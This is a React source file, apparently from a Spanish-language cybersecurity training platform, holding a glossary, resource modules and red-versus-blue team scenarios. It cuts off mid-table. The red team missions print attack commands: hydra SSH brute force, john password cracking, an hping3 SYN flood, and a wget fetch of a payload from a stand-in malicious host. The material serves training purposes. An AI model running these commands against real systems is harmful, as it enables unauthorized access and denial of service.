import React from 'react';
import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState } from './types';

// ============================================================================
// Icon Component (Lucide SVG paths)
// ============================================================================

interface IconProps extends React.SVGProps<SVGSVGElement> {
    name: string;
}

export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
    const iconPaths: { [key: string]: React.ReactNode } = {
        'book-open': <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2zM22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />,
        'graduation-cap': <><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></>,
        'library': <><path d="m16 6 4 14"/><path d="M12 6v14"/><path d="M8 8v12"/><path d="M4 4v16"/></>,
        'terminal': <><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></>,
        'chevron-down': <polyline points="6 9 12 15 18 9" />,
        'check': <polyline points="20 6 9 17 4 12" />,
        'info': <><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></>,
        'layers': <><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 7 12 12 22 7"/><polyline points="2 17 12 22 22 17"/></>,
        'shield-alert': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></>,
        'network': <><rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><rect x="9" y="2" width="6" height="6" rx="1"/><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3"/><path d="M12 12V8"/></>,
        'brain-circuit': <><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="M18 5a3 3 0 1 0-5.993.142"/><path d="M21 12a3 3 0 1 0-5.993.142"/><path d="M15 12a3 3 0 1 0-5.993.142"/><path d="M9 12a3 3 0 1 0-5.993.142"/><path d="M12 19a3 3 0 1 0-5.993.142"/><path d="M18 19a3 3 0 1 0-5.993.142"/><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="m14.65 6.01 1.35-.51"/><path d="m13.013 10.511 1.984-1.388"/><path d="m15.013 10.611 1.985 1.288"/><path d="m14.65 17.99 1.35.51"/><path d="m8.65 6.01 7.35-.5"/><path d="m9.013 10.511-1.984-1.388"/><path d="m7.013 10.611-1.985 1.288"/><path d="m8.65 17.99-1.35.51"/></>,
        'shield-off': <><path d="M19.69 14a6.9 6.9 0 0 0 .31-2V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m2 2 20 20"/></>,
        'swords': <><path d="M14.5 17.5 3 6"/><path d="m21 3-9.5 9.5"/><path d="m6.5 12.5 11 11"/></>,
        'shield-check': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>,
        'users': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>,
        'sword': <><path d="M14.5 17.5 3 6"/><path d="m21 3-9.5 9.5"/><path d="M6.5 12.5 11 8"/><path d="m16 13.5 5.5 5.5"/></>,
        'map-pin': <><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></>,
        'book-open-check': <><path d="M8 3H2v15h7c1.7 0 3 1.3 3 3V7c0-2.2-1.8-4-4-4Z"/><path d="m16 12 2 2 4-4"/><path d="M16 3h6v15h-7c-1.7 0-3 1.3-3 3V7c0-2.2 1.8-4 4-4Z"/></>,
        'book-search': <><path d="M19 21H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v3"/><circle cx="16" cy="16" r="3"/><path d="m21 21-1.4-1.4"/></>,
        'book-copy': <><path d="M2 16s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 12s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 8s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 4s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M21 8H10a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h11Z"/><path d="m14 12-2 2 2 2"/><path d="M12 16h3"/></>,
        'shield-half': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 22V2"/></>,
        'radio-tower': <><path d="M4.6 13.7 12 2l7.4 11.7"/><path d="M8.5 12h7"/><path d="M12 12V2"/><path d="m14 16-1-3-1 3h2"/><path d="m10 16-1-3-1 3h2"/><path d="m18 19-3-6-3 6h6"/><path d="m6 19-3-6-3 6h6"/></>,
        'alert-octagon': <><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'refresh-cw': <><path d="M3 2v6h6"/><path d="M21 12A9 9 0 0 0 6 5.3L3 8"/><path d="M21 22v-6h-6"/><path d="M3 12a9 9 0 0 0 15 6.7l3-2.7"/></>,
        'search': <><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></>,
        'chevrons-up': <><path d="m17 11-5-5-5 5"/><path d="m17 18-5-5-5 5"/></>,
        'flag': <><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" x2="4" y1="22" y2="15"/></>,
        'clipboard-list': <><rect width="8" height="4" x="8" y="2" rx="1" ry="1" /><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" /><path d="M12 11h4" /><path d="M12 16h4" /><path d="M8 11h.01" /><path d="M8 16h.01" /></>,
        'target': <><circle cx="12" cy="12" r="10" /><circle cx="12" cy="12" r="6" /><circle cx="12" cy="12" r="2" /></>,
        'file-text': <><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><line x1="16" x2="8" y1="13" y2="13" /><line x1="16" x2="8" y1="17" y2="17" /><line x1="10" x2="8" y1="9" y2="9" /></>,
        'alert-triangle': <><path d="m21.73 18-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></>,
        'binoculars': <><circle cx="15" cy="15" r="3"/><circle cx="9" cy="15" r="3"/><path d="M15 12v-3"/><path d="M9 12v-3"/><path d="m19 12-2-4"/><path d="m5 12 2-4"/></>,
        'file-clock': <><path d="M16 22h2a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/><path d="M4 14a6 6 0 1 0 12 0 6 6 0 0 0-12 0Z"/><path d="M10 14.5V12h-1.5"/></>,
        'log-out': <><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></>,
        'bomb': <><circle cx="12" cy="16" r="1"/><path d="M20 12a8 8 0 1 0-16 0"/><path d="M22 8s-1.5 0-3-2c-1.5-2-3-3-3-3"/><path d="m2 8 3-2c1.5-2 3-3 3-3"/></>,
        'download': <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></>,
        'activity': <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
        'file-search': <><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><circle cx="10.5" cy="13.5" r="2.5" /><path d="M12.5 15.5 15 18" /></>,
        'power': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'plus-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></>,
        'trash': <><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>,
        'keyboard': <><rect x="2" y="16" width="20" height="6" rx="2"/><path d="M6 10h4"/><path d="M14 10h4"/><path d="M6 6h.01"/><path d="M10 6h.01"/><path d="M14 6h.01"/><path d="M18 6h.01"/></>,
    };

    return (
        <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className={className}
            {...props}
        >
            {iconPaths[name] || null}
        </svg>
    );
};


const CisoCard: React.FC<{ icon?: string; title?: string; children: React.ReactNode }> = ({ icon, title, children }) => (
    <div className="bg-[rgba(85,107,47,0.25)] backdrop-blur-md border border-[rgba(184,134,11,0.3)] rounded-xl p-4 sm:p-6 mb-6 last:mb-0 transition-all duration-300 hover:bg-[rgba(85,107,47,0.4)] hover:border-[rgba(184,134,11,0.5)]">
        {title && (
            <h4 className="text-[var(--cv-gold)] font-bold text-lg mb-3 flex items-center">
                {icon && <Icon name={icon} className="h-5 w-5 mr-2 flex-shrink-0" />}
                {title}
            </h4>
        )}
        <div className="text-[var(--text-secondary)] text-sm sm:text-base leading-relaxed space-y-2">
            {children}
        </div>
    </div>
);

const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
    <div className="overflow-x-auto border border-[rgba(184,134,11,0.2)] rounded-lg my-4 shadow-lg">
        <table className="w-full min-w-[600px] border-collapse">
            <thead>
                <tr>
                    {headers.map((header, i) => (
                        <th key={i} className="p-3 text-left text-sm font-semibold bg-[rgba(184,134,11,0.1)] text-[var(--cv-gold)] whitespace-nowrap border-b border-[rgba(184,134,11,0.2)]">{header}</th>
                    ))}
                </tr>
            </thead>
            <tbody>
                {rows.map((row, i) => (
                    <tr key={i} className="bg-black/10 even:bg-black/20">
                        {row.map((cell, j) => (
                            <td key={j} className="p-3 text-sm text-[var(--text-secondary)] border-b border-[rgba(184,134,11,0.1)] last:border-b-0">{cell}</td>
                        ))}
                    </tr>
                ))}
            </tbody>
        </table>
    </div>
);

// ============================================================================
// Simulation Defaults
// ============================================================================

const getInitialPrompt = (team: 'Red' | 'Blue'): PromptState => {
    if (team === 'Blue') {
        return { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };
    }
    return { user: 'pasante-red', host: 'soc-valtorix', dir: '~' };
};

const getWelcomeMessage = (team: 'Red' | 'Blue'): TerminalLine[] => [
    { text: `Bienvenido a la terminal del Equipo ${team}.`, type: 'output' },
    { html: "Escriba <strong class='text-amber-300'>help</strong> para ver sus objetivos y comandos.", type: 'html' },
];

export const DEFAULT_SIMULATION_STATE = {
    firewall_enabled: false,
    ssh_hardened: false,
    banned_ips: [],
    payload_deployed: false,
    is_dos_active: false,
    admin_password_found: false,
    db_config_permissions: '644',
    hydra_run_count: 0,
    server_load: 5.0,
    terminal_output_red: getWelcomeMessage('Red'),
    terminal_output_blue: getWelcomeMessage('Blue'),
    prompt_red: getInitialPrompt('Red'),
    prompt_blue: getInitialPrompt('Blue'),
};


// ============================================================================
// Static Content Data
// ============================================================================

export const GLOSSARY_TERMS: GlossaryTerm[] = [
    { term: "Dirección IP (IPv4/IPv6)", definition: "Identificador numérico único para dispositivos en una red. (Ver: Guía IP, Fundamentos)" },
    { term: "Modelo OSI", definition: "Modelo teórico de 7 capas (Física, Enlace, Red, Transporte, Sesión, Presentación, Aplicación) para entender la comunicación de redes. (Ver: Protocolos, Fundamentos)" },
    { term: "Modelo TCP/IP", definition: "Modelo práctico de 4 capas (Acceso a Red, Internet, Transporte, Aplicación) sobre el que funciona Internet. (Ver: Protocolos, Fundamentos)" },
    { term: "Protocolo", definition: "Conjunto de reglas que definen cómo se comunican los dispositivos. (Ver: Fundamentos, Protocolos)" },
    { term: "TCP (Protocolo de Control de Transmisión)", definition: "Protocolo de Capa 4, fiable y orientado a conexión (como correo certificado). (Ver: Fundamentos, Protocolos)" },
    { term: "UDP (Protocolo de Datagramas de Usuario)", definition: "Protocolo de Capa 4, rápido y no fiable (como tarjeta postal). (Ver: Fundamentos, Protocolos)" },
    { term: "Puerto de Red", definition: "Identificador numérico (0-65535) que dirige el tráfico a una aplicación específica en un dispositivo. (Ver: Fundamentos)" },
    { term: "Socket", definition: "Combinación de una Dirección IP y un Puerto, creando un punto final de comunicación único (ej. 192.168.1.1:443). (Ver: Fundamentos)" },
    { term: "DNS (Sistema de Nombres de Dominio)", definition: "La \"agenda telefónica\" de Internet. Traduce nombres de dominio (cybervaltorix.com) a direcciones IP. (Ver: Recursos)" },
    { term: "NetID y HostID", definition: "Las dos partes de una IP: el NetID identifica la red y el HostID identifica al dispositivo en esa red. (Ver: Recursos)" },
    { term: "IP Pública vs. Privada", definition: "Pública (única en Internet) vs. Privada (reutilizable en redes locales, ej. 192.168.x.x). (Ver: Recursos)" },
    { term: "NAT (Network Address Translation)", definition: "Permite a múltiples dispositivos en una red privada compartir una única IP pública. (Ver: Recursos)" },
    { term: "Subnetting (Subredes)", definition: "Técnica de dividir una red grande en redes más pequeñas (subredes) para mejorar la organización y seguridad. (Ver: Recursos)" },
    { term: "Máscara de Subred", definition: "Número (ej. 255.255.255.0 o /24) que define qué porción de una IP es el NetID y qué porción es el HostID. (Ver: Recursos)" },
    { term: "VLSM (Máscara de Subred de Longitud Variable)", definition: "Técnica avanzada de subnetting que permite crear subredes de diferentes tamaños para maximizar la eficiencia de IPs. (Ver: Recursos)" },
    { term: "Encapsulación", definition: "Proceso de \"envolver\" datos con encabezados de control a medida que bajan por las capas del modelo de red. (Ver: Recursos)" },
    { term: "PDU (Unidad de Datos de Protocolo)", definition: "El nombre genérico de los \"datos\" en cada capa: Trama (Capa 2), Paquete (Capa 3), Segmento/Datagrama (Capa 4). (Ver: Recursos)" },
];

export const TRAINING_SCENARIOS: TrainingScenario[] = [
    {
        id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Reciben dos tickets de soporte simultáneamente:</p>
                <ul>
                    <li><strong>Ticket A:</strong> Un usuario (<code>192.168.1.50</code>) se queja de que <code>http://intranet.cybervaltorix.local</code> (<code>10.10.30.5</code>) carga "extremadamente lento".</li>
                    <li><strong>Ticket B:</strong> Otro usuario (<code>192.168.1.52</code>) reporta que no puede acceder a <code>\\srv-files.cybervaltorix.local</code> (<code>10.10.40.10</code>). Un <code>ping</code> falla con "Destination Host Unreachable".</li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                 <p>Son Nivel 1. Aísles el problema desde su máquina Kali (<code>192.168.1.0/24</code>).</p>
                 <h4>Entregables</h4>
                 <ul>
                     <li><strong>Proceso de Diagnóstico:</strong> Pasos y comandos para ambos tickets.</li>
                     <li><strong>Aislamiento de Capa:</strong> ¿Qué capa (TCP/IP) es la sospechosa para el Ticket A? ¿Y para el Ticket B?</li>
                     <li><strong>Herramientas:</strong> ¿Qué comandos (<code>ping</code>, <code>traceroute</code>, etc.) usarían?</li>
                 </ul>
            </CisoCard>
        </div>
    },
     {
        id: 'escenario2', icon: 'shield-alert', color: 'bg-red-500', title: 'Escenario 2: El Vector de Ataque (DNS)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Monitoreando logs de firewall. El Resolver DNS interno es <code>172.16.10.5</code>. Una laptop (<code>172.16.20.100</code>) muestra tráfico anómalo:</p>
                <pre><code>... 172.16.20.100:34876 -&gt; 8.8.8.8:53 ... ALLOWED
... 172.16.20.100:34877 -&gt; 1.1.1.1:53 ... ALLOWED
... 172.16.20.100:41982 -&gt; 198.51.100.50:53 ... ALLOWED</code></pre>
                <p><code>198.51.100.50</code> es un resolver desconocido en Rusia. El tráfico es constante y las consultas parecen sin sentido (ej. <code>aHR0...com</code>).</p>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <ol>
                    <li>Analizar y explicar el evento.</li>
                    <li>Proponer contención inmediata (firewall).</li>
                </ol>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Análisis de Amenaza:</strong> ¿Riesgo? ¿Por qué es malo usar <code>8.8.8.8</code>? ¿Qué es el tráfico a <code>198.51.100.50</code>?</li>
                    <li><strong>Política de Contención:</strong> Escriba la política de firewall de egreso (Origen, Destino, Puerto) para neutralizar y prevenir esto.</li>
                    <li><strong>Simulación (Opcional):</strong> ¿Qué comando de Kali usaría para simular esta consulta anómala?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario3', icon: 'network', color: 'bg-green-500', title: 'Escenario 3: La Segmentación (Subnetting y ACLs)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Implementando política "Zero Trust" en el firewall que segmenta las subredes VLSM.</p>
                <h5>Las Zonas de Red:</h5>
                <ul>
                    <li><strong>Zona 1 (Invitados):</strong> <code>192.168.10.0/24</code></li>
                    <li><strong>Zona 2 (Corporativa):</strong> <code>192.168.20.0/25</code></li>
                    <li><strong>Zona 3 (Desarrollo):</strong> <code>192.168.20.128/26</code></li>
                    <li><strong>Zona 4 (Servidores):</strong> <code>192.168.30.0/27</code>
                        <ul className="ml-6 mt-1 text-sm">
                            <li><code>192.168.30.10</code> = Servidor Archivos (SMB, 445/TCP)</li>
                            <li><code>192.168.30.15</code> = Servidor BD (SQL, 1433/TCP)</li>
                        </ul>
                    </li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <p>Definir la matriz de reglas de firewall (ACLs) que controla el tráfico <strong>entre</strong> estas zonas.</p>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Principio Rector:</strong> ¿Cuál es la <strong>primera</strong> regla que debe existir en cualquier política de firewall entre zonas?</li>
                    <li><strong>Matriz de ACLs:</strong> Defina qué tráfico está permitido/denegado. (Ej. ¿Zona 2 a Zona 4? ¿Zona 1 a cualquier otra?).</li>
                    <li><strong>Prueba de Verificación (Kali):</strong> ¿Qué comando usaría desde Zona 1 para <strong>probar</strong> que su bloqueo a Zona 4 es efectivo?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario4', icon: 'brain-circuit', color: 'bg-yellow-500', title: 'Escenario 4: Análisis de DNS, VLSM e Incidentes (Taller 2)',
        subtitle: 'Tiempo Estimado: 45 minutos',
        content: <>
            <CisoCard icon="book-copy" title="Sección 1: Fundamentos Operativos de DNS">
                <p>Responda las siguientes preguntas basándose en el material de recursos.</p>
                <ol>
                    <li><strong>El Gerente de Marketing:</strong> Un gerente le pregunta: "¿Qué es el DNS y por qué Tl habla tanto de él?" Explíquelo en términos sencillos, enfocándose en por qué es crítico para el negocio.</li>
                    <li><strong>El Arquitecto de Redes:</strong> Un arquitecto pregunta: "¿Por qué necesito abrir tanto UDP como TCP en el puerto 53? ¿No era DNS solo UDP?" Justifique la necesidad de ambos.</li>
                    <li><strong>Análisis de Proceso:</strong> Describa la diferencia fundamental entre una consulta DNS recursiva y una iterativa. ¿Cuál inicia su laptop y cuál realiza nuestro resolver interno?</li>
                </ol>
            </CisoCard>
            <CisoCard icon="shield-half" title="Sección 2: Escenarios de Ataque DNS">
                <ol start={4}>
                    <li><strong>Escenario (Pharming):</strong> Varios usuarios reportan que al escribir <code>www.nuestro-banco-asociado.com</code>, llegan a un sitio clonado que pide "verificar" su información. ¿Cuál es el ataque más probable? ¿El problema está en la laptop o en un servidor?</li>
                    <li><strong>Escenario (DDoS):</strong> El NOC reporta que nuestro servidor web está saturado por un volumen masivo de <strong>respuestas</strong> DNS anormalmente grandes. ¿Qué tipo de ataque DDoS es este? ¿Por qué el atacante usaría servidores de terceros?</li>
                    <li><strong>Mitigación Estratégica:</strong> El material menciona una tecnología con firmas criptográficas para proteger la integridad de las respuestas DNS. ¿Cómo se llama? ¿Cómo habría prevenido el ataque del Escenario 4?</li>
                </ol>
            </CisoCard>
        </>
    },
    {
        id: 'escenario5', icon: 'shield-off', color: 'bg-red-700', title: 'Escenario 5: "El Peor Día" (Recuperación de Control)',
        subtitle: 'Equipo Azul - Respuesta a Incidentes',
        content: <>
            <CisoCard icon="alert-octagon" title='Situación: 10. "El Peor Día"'>
                <p>Es lunes, 9:00 AM. Clientes reportan que nuestro sitio (<code>www.esit-pasantes.com</code>) es una página de phishing pidiendo tarjetas de crédito. TI confirma que no pueden iniciar sesión en <code>WEB-PROD-01</code>; sus contraseñas de admin y root han sido cambiadas. Han perdido el control.</p>
            </CisoCard>
            <CisoCard icon="shield" title="FASE A: CONTENCIÓN (Detener el fraude AHORA)">
                <p><strong>Menú de Herramientas/Acciones:</strong></p>
                <ol>
                    <li><strong>Firewall de Red (ACLs):</strong> Bloquear la IP del servidor <code>WEB-PROD-01</code>.</li>
                    <li><strong>Consola del Hipervisor (vSphere/Hyper-V):</strong> "Desconectar" la tarjeta de red virtual (vNIC) del servidor.</li>
                    <li><strong>Registrador de DNS Público:</strong> Cambiar el registro DNS <code>www.esit-pasantes.com</code> para que apunte a una IP de "página en mantenimiento".</li>
                    <li><strong>Desconectar el Servidor:</strong> Ir al data center y desconectar el cable físico.</li>
                </ol>
                 <h4>Su Tarea (A):</h4>
                 <p>Priorice las acciones del menú. ¿Cuál es la acción MÁS RÁPIDA y EFECTIVA para detener el fraude al cliente? ¿Por qué las otras opciones son peores o más lentas?</p>
            </CisoCard>
        </>
    },
    {
        id: 'escenario6', icon: 'swords', color: 'bg-purple-500', title: 'Escenario 6: "El Cazador" (Simulación de Equipo Rojo)',
        subtitle: 'Equipo Rojo - Pentesting',
        content: <>
             <CisoCard icon="user-check" title="Equipo y Misión">
                <p><strong>Equipo:</strong> Esta tarea es para el equipo de pentesting (Equipo Rojo). El Equipo Azul (resto de pasantes) estará en modo defensivo.</p>
                <p><strong>Misión:</strong> Su trabajo es causar el incidente del Escenario 5. Comprometer <code>WEB-PROD-01</code> (en sandbox), bloquear a los administradores y suplantar el sitio web.</p>
            </CisoCard>
             <CisoCard icon="binoculars" title="FASE 1: RECONOCIMIENTO Y ACCESO INICIAL">
                <p><strong>Objetivo:</strong> Encontrar una forma de entrar (ej. phishing a un admin).</p>
                <h4>Su Tarea (Fase 1):</h4>
                <p>Describan cómo identificarían a su objetivo y qué método de "Acceso Inicial" elegirían.</p>
            </CisoCard>
        </>
    },
    {
        id: 'escenario7', icon: 'shield-check', color: 'bg-indigo-500', title: 'Escenario 7: Fortaleza Digital (Hardening vs. Pentest)',
        subtitle: 'Equipo Rojo vs. Equipo Azul',
        content: <>
            <CisoCard icon="users" title="Taller Operativo: Fortaleza Digital">
                <p>Tenemos un nuevo activo de alto valor: <strong>"Bóveda-Web"</strong>. Actualmente, está en configuración "por defecto", lo que significa "inseguro".</p>
                <p>Host del Defensor (Azul): <code>ssh blue-team@BOVEDA-WEB</code></p>
                <p>Host del Atacante (Rojo): <code>pasante@soc-valtorix</code> (su terminal local)</p>
            </CisoCard>
            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: LOS GUARDIANES (Hardening)">
                <p><strong>Objetivo:</strong> Asegurar el servidor <code>BOVEDA-WEB</code>.</p>
                <h5>Objetivo 1: Validación de Cifrado (SSL/HTTPS)</h5>
                <pre><code>openssl s_client -connect BOVEDA-WEB:443</code></pre>
                <h5>Objetivo 2: Permisos (Menor Privilegio)</h5>
                <pre><code>ls -l /var/www/html/db_config.php
chmod 640 /var/www/html/db_config.php</code></pre>
            </CisoCard>
            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: LOS AUDITORES (Pentest)">
                <p><strong>Objetivo:</strong> Encontrar las grietas antes que los criminales.</p>
                 <h5>1. Reconocimiento (Nmap)</h5>
                <pre><code>nmap -sV -sC BOVEDA-WEB</code></pre>
                <h5>5. Fuerza Bruta (Hydra)</h5>
                <pre><code>hydra -l root -P /path/to/wordlist.txt ssh://BOVEDA-WEB</code></pre>
            </CisoCard>
        </>
    },
    {
        id: 'escenario8', icon: 'bomb', color: 'bg-orange-600', title: 'Escenario 8: Furia en la Red (Ataque Combinado)',
        subtitle: 'Equipo Rojo vs. Equipo Azul',
        content: <>
            <CisoCard icon="clipboard-list" title="Situación del Incidente">
                <p>El portal de acceso público <strong>"PORTAL-WEB"</strong> está bajo un ataque coordinado. El NOC reporta quejas de clientes sobre errores de "Conexión Rechazada" (DoS). Al mismo tiempo, el SIEM dispara una alerta por múltiples intentos de login fallidos contra la cuenta <code>admin</code>.</p>
                <p>Host del Defensor (Azul): <code>ssh blue-team@PORTAL-WEB</code></p>
                <p>Host del Atacante (Rojo): <code>pasante-red@soc-valtorix</code></p>
            </CisoCard>
            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: RESPUESTA Y RECUPERACIÓN">
                <p><strong>Objetivo:</strong> Identificar, mitigar y recuperarse del ataque.</p>
                <h5>1. Diagnóstico de Carga (top/htop)</h5>
                <pre><code>top</code></pre>
                <h5>2. Análisis de Logs (journalctl)</h5>
                <pre><code>journalctl -u sshd | grep "Failed password"</code></pre>
                 <h5>3. Mitigación (Firewall y Fail2Ban)</h5>
                <pre><code>sudo ufw deny from [IP_ATACANTE]
sudo fail2ban-client set sshd banip [IP_ATACANTE]</code></pre>
                <h5>4. Verificación de Integridad (post-brecha)</h5>
                <pre><code>sha256sum /var/www/html/index.php</code></pre>
            </CisoCard>
            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: INFILTRACIÓN Y DISRUPCIÓN">
                <p><strong>Objetivo:</strong> Ganar acceso y causar denegación de servicio.</p>
                 <h5>1. Cracking de Contraseña (John/Hydra)</h5>
                <pre><code>john --wordlist=rockyou.txt hash.txt
hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</code></pre>
                 <h5>2. Ataque DoS (hping3)</h5>
                <pre><code>sudo hping3 --flood -S PORTAL-WEB</code></pre>
                <h5>3. Acceso y "Payload" (wget)</h5>
                <pre><code>ssh admin@PORTAL-WEB
wget http://malware-repo.bad/payload.sh</code></pre>
            </CisoCard>
        </>
    },
];

export const RESOURCE_MODULES: ResourceModule[] = [
    {
        id: 'recurso-osi', icon: 'layers', title: 'Fundamentos: Modelos OSI y TCP/IP',
        content: <CisoCard>
            <h4>¿Qué son?</h4>
            <p>Son "manuales de instrucciones" conceptuales que dividen la compleja comunicación de red en capas. No son protocolos físicos, sino una forma de entender <strong>cómo</strong> deberían funcionar los protocolos.</p>
            <h4>Relevancia Operativa (CISO)</h4>
            <p>Usamos el Modelo OSI <strong>diariamente</strong> para aislar problemas. Si un usuario no puede acceder a un sitio (Ticket A), ¿el problema es de Capa 1 (cable), Capa 3 (enrutamiento/firewall) o Capa 7 (aplicación web caída)? Saber esto evita perder tiempo.</p>
        </CisoCard>
    },
    {
        id: 'recurso-ip', icon: 'map-pin', title: 'Fundamentos: IP y Subnetting',
        content: <CisoCard>
            <h4>¿Qué es?</h4>
            <p>El sistema de "direcciones postales" de la red. El Subnetting es la técnica para dividir un gran "código postal" (red) en "barrios" más pequeños (subredes) para organizar el tráfico y mejorar la seguridad.</p>
            <h4>Relevancia Operativa (CISO)</h4>
            <p>El Subnetting es nuestra principal herramienta de <strong>segmentación de seguridad</strong>. (Ver Escenario 3). Al poner a los "Invitados" en una subred (<code>192.168.10.0/24</code>) y a los "Servidores" en otra (<code>192.168.30.0/27</code>), podemos crear reglas de firewall para que NUNCA puedan hablar entre sí.</p>
        </CisoCard>
    },
    {
        id: 'recurso-dns-basico', icon: 'book-search', title: 'Fundamentos: DNS',
        content: <CisoCard>
            <h4>¿Qué es?</h4>
            <p>La "agenda telefónica" de Internet. Traduce nombres fáciles de recordar (<code>cybervaltorix.com</code>) a las direcciones IP que usan las máquinas.</p>
            <h4>Relevancia Operativa (CISO)</h4>
            <p>El DNS es un vector de ataque principal (Ver Escenario 2). El malware lo usa para "llamar a casa" (C2) o para robar datos (Tunelización de DNS). Por eso, en un SOC, <strong>monitoreamos</strong> y <strong>controlamos</strong> el tráfico DNS.</p>
        </CisoCard>
    },
    {
        id: 'recurso-dns-avanzado', icon: 'book-copy', title: 'Análisis Profundo: DNS (Taller 2)',
        content: <>
            <CisoCard icon="file-text" title="Tipos de Registros DNS Comunes">
                <CisoTable 
                    headers={['Registro', 'Nombre Completo', 'Función', 'Ejemplo de Valor']}
                    rows={[
                        [<strong>A</strong>, 'Address', 'Asocia un dominio a una dirección IPv4.', <code>172.217.14.228</code>],
